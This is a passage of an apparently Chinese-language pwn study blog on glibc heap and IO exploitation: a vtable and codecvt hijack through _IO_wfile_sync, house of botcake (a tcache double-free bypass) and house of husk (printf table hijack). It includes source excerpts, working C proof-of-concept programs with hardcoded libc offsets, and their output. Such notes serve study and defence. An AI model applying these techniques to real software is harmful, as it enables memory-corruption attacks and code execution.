<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">wint_t</span> retval = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="comment">// 不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (fp))</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  delta = fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">  <span class="comment">// 需要进入到这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (delta != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We have to find out how many bytes we have to go back in the</span></span><br><span class="line"><span class="comment">     external buffer.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cv</span> =</span> fp-&gt;_codecvt;</span><br><span class="line">      <span class="type">off64_t</span> new_pos;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 这里直接返回-1即可</span></span><br><span class="line">      <span class="type">int</span> clen = __libio_codecvt_encoding (cv);</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (clen &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="comment">/* It is easy, a fixed number of input bytes are used for each</span></span><br><span class="line"><span class="comment">       wide character.  */</span></span><br><span class="line">    delta *= clen;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We have to find out the hard way how much to back off.</span></span><br><span class="line"><span class="comment">         To do this we determine how much input we needed to</span></span><br><span class="line"><span class="comment">         generate the wide characters up to the current reading</span></span><br><span class="line"><span class="comment">         position.  */</span></span><br><span class="line">      <span class="type">int</span> nread;</span><br><span class="line">      <span class="type">size_t</span> wnread = (fp-&gt;_wide_data-&gt;_IO_read_ptr</span><br><span class="line">               - fp-&gt;_wide_data-&gt;_IO_read_base);</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_state = fp-&gt;_wide_data-&gt;_IO_last_state;</span><br><span class="line">    <span class="comment">// 调用到这里</span></span><br><span class="line">      nread = __libio_codecvt_length (cv, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                      fp-&gt;_IO_read_base,</span><br><span class="line">                      fp-&gt;_IO_read_end, wnread);</span><br><span class="line">            <span class="comment">// ......</span></span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要设置<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &lt;= fp-&gt;_wide_data-&gt;_IO_write_base</code>和<code>fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end != 0</code>。</p>
<p>然后看下<code>__libio_codecvt_encoding</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__libio_codecvt_encoding (<span class="keyword">struct</span> _IO_codecvt *codecvt)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* See whether the encoding is stateful.  */</span></span><br><span class="line">  <span class="keyword">if</span> (codecvt-&gt;__cd_in.step-&gt;__stateful)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="comment">/* Fortunately not.  Now determine the input bytes for the conversion</span></span><br><span class="line"><span class="comment">     necessary for each wide character.  */</span></span><br><span class="line">  <span class="keyword">if</span> (codecvt-&gt;__cd_in.step-&gt;__min_needed_from</span><br><span class="line">      != codecvt-&gt;__cd_in.step-&gt;__max_needed_from)</span><br><span class="line">    <span class="comment">/* Not a constant value.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> codecvt-&gt;__cd_in.step-&gt;__min_needed_from;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接设置<code>fp-&gt;codecvt-&gt;__cd_in.step-&gt;__stateful != 0</code>即可返回<code>-1</code>。</p>
<h2 id="示例-6"><a href="#示例-6" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m[!] Backdoor is called!\n&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *p1 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> *p2 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate two 0x200 chunks&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="type">void</span> *)puts_addr);</span><br><span class="line">    <span class="type">size_t</span> libc_base_addr = puts_addr - <span class="number">0x84420</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc base address: %p\n&quot;</span>, (<span class="type">void</span> *)libc_base_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> _IO_2_1_stderr_addr = libc_base_addr + <span class="number">0x1ed5c0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_2_1_stderr_ address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_2_1_stderr_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> _IO_wfile_jumps_addr = libc_base_addr + <span class="number">0x1e8f60</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wfile_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_wfile_jumps_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *stderr2 = (<span class="type">char</span> *)_IO_2_1_stderr_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: set stderr-&gt;_flags to ~(4 | 0x10))&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr2 = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: set stderr-&gt;_IO_read_ptr &lt; stderr-&gt;_IO_read_end&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0x10</span>) = (<span class="type">size_t</span>)<span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: set stderr-&gt;vtable to _IO_wfile_jumps-0x40&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xd8</span>) = _IO_wfile_jumps_addr<span class="number">-0x40</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: set stderr-&gt;codecvt with the allocated chunk p1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0x98</span>) = (<span class="type">size_t</span>)p1;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: set stderr-&gt;codecvt-&gt;__cd_in.step with the allocated chunk p2&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)p1 = (<span class="type">size_t</span>)p2;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 6: put backdoor at stderr-&gt;codecvt-&gt;__cd_in.step-&gt;__fct&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p2 + <span class="number">0x28</span>) = (<span class="type">size_t</span>)(&amp;backdoor);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 7: call fflush(stderr) to trigger backdoor func&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[*] allocate two <span class="number">0x200</span> chunks</span><br><span class="line">[*] <span class="built_in">puts</span> address: <span class="number">0x7f3b2d0a2420</span></span><br><span class="line">[*] libc base address: <span class="number">0x7f3b2d01e000</span></span><br><span class="line">[*] _IO_2_1_stderr_ address: <span class="number">0x7f3b2d20b5c0</span></span><br><span class="line">[*] _IO_wfile_jumps address: <span class="number">0x7f3b2d206f60</span></span><br><span class="line">[+] step <span class="number">1</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_flags to ~(<span class="number">4</span> | <span class="number">0x10</span>))</span><br><span class="line">[+] step <span class="number">2</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_IO_read_ptr &lt; <span class="built_in">stderr</span>-&gt;_IO_read_end</span><br><span class="line">[+] step <span class="number">3</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;vtable to _IO_wfile_jumps<span class="number">-0x40</span></span><br><span class="line">[+] step <span class="number">4</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;codecvt with the allocated chunk p1</span><br><span class="line">[+] step <span class="number">5</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;codecvt-&gt;__cd_in.step with the allocated chunk p2</span><br><span class="line">[+] step <span class="number">6</span>: put backdoor at <span class="built_in">stderr</span>-&gt;codecvt-&gt;__cd_in.step-&gt;__fct</span><br><span class="line">[+] step <span class="number">7</span>: call <span class="title function_">fflush</span><span class="params">(<span class="built_in">stderr</span>)</span> to trigger backdoor func</span><br><span class="line">[!] Backdoor is called!</span><br></pre></td></tr></table></figure>
<h1 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h1><h2 id="概要-17"><a href="#概要-17" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>绕过新版本glibc的tcache-&gt;key验证</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>uaf</li>
</ol>
<p><strong>利用效果:</strong>double free</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理-17"><a href="#原理-17" class="headerlink" title="原理"></a>原理</h2><p>当 free 掉一个堆块进入 tcache 时，假如堆块的 bk 位存放的 <code>key == tcache_key</code> ， 就会遍历<strong>这个大小</strong>的 Tcache ，假如发现同地址的堆块，则触发 Double Free 报错。</p>
<p>从攻击者的角度来说，我们如果想继续利用 Tcache Double Free 的话，一般可以采取以下的方法：</p>
<ol>
<li>破坏掉被 free 的堆块中的 key,绕过检查</li>
<li>改变被 free 的堆块的大小，遍历时进入另一 idx 的 tc_entries</li>
<li><strong>House of botcake</strong></li>
</ol>
<p>House of botcacke 合理利用了 Tcache 和 Unsortedbin 的机制，同一堆块第一次 Free 进 Unsortedbin 避免了 key 的产生，第二次 Free 进入 Tcache，让高版本的 Tcache Double Free 再次成为可能。</p>
<p>此外 House of botcake 在条件合适的情况下，极其容易完成多次任意分配堆块，是相当好用的手法。</p>
<p>简单来说就是一个chunkA,</p>
<p>其所属的tcache在第一次free时为满状态,使得其进入了unsortedbin</p>
<p>之后取出tcache中的chunk使其不满,在释放A使其进入tcache,达到double free</p>
<h2 id="示例-7"><a href="#示例-7" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed into tcache</span></span><br><span class="line">   </span><br><span class="line">    <span class="type">int</span> prev_size = prev[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line">    <span class="type">int</span> a_size = a[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line">    </span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">    prev[<span class="number">0x110</span>/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>)] = <span class="number">0x41414141</span>;</span><br><span class="line">    assert(a[<span class="number">0</span>] == <span class="number">0x41414141</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h1><h2 id="概要-18"><a href="#概要-18" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>利用printf的自定义格式化字符串</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>能向 <code>__printf_function_table</code> 中写入任意数据，使其不为空</li>
<li>能向 <code>__printf_arginfo_table</code> 中写入一个可控地址让 <code>__printf_arginfo_table[spec]</code> 为 <code>backdoor</code> 地址</li>
</ol>
<p><strong>利用效果:</strong>程序流执行</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理-18"><a href="#原理-18" class="headerlink" title="原理"></a>原理</h2><p>首先要先认识下 <code>__register_printf_function</code> 函数,该函数的作用是允许用户自定义格式化字符并进行注册（注册的意思是说将自定义格式化字符与相应的处理函数相关联），以打印用户自定义数据类型的数据。</p>
<p><code>__register_printf_function</code> 函数是对 <code>__register_printf_specifier</code> 进行的封装，下面是 <code>__register_printf_specifier</code> 的源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Register FUNC to be called to format SPEC specifiers.  */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_specifier (<span class="type">int</span> spec, printf_function converter,</span><br><span class="line">			     printf_arginfo_size_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (spec &lt; <span class="number">0</span> || spec &gt; (<span class="type">int</span>) UCHAR_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__printf_function_table == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_arginfo_table = (printf_arginfo_size_function **)</span><br><span class="line">	<span class="built_in">calloc</span> (UCHAR_MAX + <span class="number">1</span>, <span class="keyword">sizeof</span> (<span class="type">void</span> *) * <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> (__printf_arginfo_table == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  result = <span class="number">-1</span>;</span><br><span class="line">	  <span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      __printf_function_table = (printf_function **)</span><br><span class="line">	(__printf_arginfo_table + UCHAR_MAX + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __printf_function_table[spec] = converter;</span><br><span class="line">  __printf_arginfo_table[spec] = arginfo;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>spec是自定义的格式化字符（以 <code>ASCII</code> 所表示），比如你使用 <code>%a</code> 这个格式化字符来输出自定义的数据类型，那么 <code>spec</code> 就是字符 `a’</p>
<p>上面的代码先做了第一个 <code>if</code> 判断，要确定 <code>spec</code> 位于 <code>0</code> 和 <code>0xff</code> 之间，如果不在 <code>ASCII</code> 码就会返回 <code>-1</code></p>
<p>第二个判断是如果 <code>__printf_function_table</code> 为空，那么就通过 <code>calloc</code> 来分配两个索引表，并将地址存放到 <code>__printf_arginfo_table</code> 和 <code>__printf_function_table</code> 中。两个表的大小都为 <code>0x100</code> ，可以给 <code>0~0xff</code> 的每个字符注册一个函数指针（假设我定义一个 <code>%X</code> 的格式化字符，那么 <code>spec</code> 就是 <code>88</code> ，所以将 <code>__printf_arginfo_table[88]</code> 此处存放一个对应处理函数的指针）</p>
<p><strong>需要注意的是，接下来的利用并不会调用到上面这个函数，但需要用到这个注册自定义格式化字符的前置知识。</strong></p>
<p><code>printf</code> 函数调用了 <code>vfprintf</code> 函数，下面的代码是 <code>vprintf</code> 函数中的部分片段，可以看出来如果 <code>__printf_function_table</code> 不为空（也就意味着有自定义格式化字符被注册过了）那么就会调用 <code>printf_positional</code> 函数,如果为空的话，就会去执行默认格式化字符的代码部分（因此<strong>检查自定义的格式化字符是优先于默认的格式化字符</strong>）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">goto</span> do_positional;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">do_positional:</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (workstart != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (workstart);</span><br><span class="line">      workstart = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">			    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">			    save_errno, grouping, thousands_sep);</span><br></pre></td></tr></table></figure>
<p>而 <code>printf_positional</code> 函数中会调用 <code>__parse_one_specmb</code> 函数</p>
<p><code>__parse_one_specmb</code> 函数中最关键的就是下面这个片段</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">    || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">    || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span></span><br><span class="line">    <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment">uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment">the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">    || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])</span><br><span class="line">		   (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">		    &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>可以看到最后执行了 <code>(*__printf_arginfo_table[spec-&gt;info.spec])</code> 这里本应是注册的正常的函数指针，但如果我们能够篡改 <code>__printf_arginfo_table</code> 中存放的地址，将其改为我们可控的内存地址，这样我只需要在 <code>__printf_arginfo_table[88]</code> （以 <code>%X</code> 为例）的位置存放一个 <code>one_gadget</code> 的地址，执行到函数指针指向的位置即可跳转到 控制函数中</p>
<p><strong>注意：上面的利用始终都没有注册自定义的格式化字符，而是通过直接篡改 <code>__printf_function_table</code> 来错让程序以为存在注册过的自定义格式化字符，从而触发 <code>__printf_arginfo_table</code> 中的函数指针</strong></p>
<h2 id="示例-8"><a href="#示例-8" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 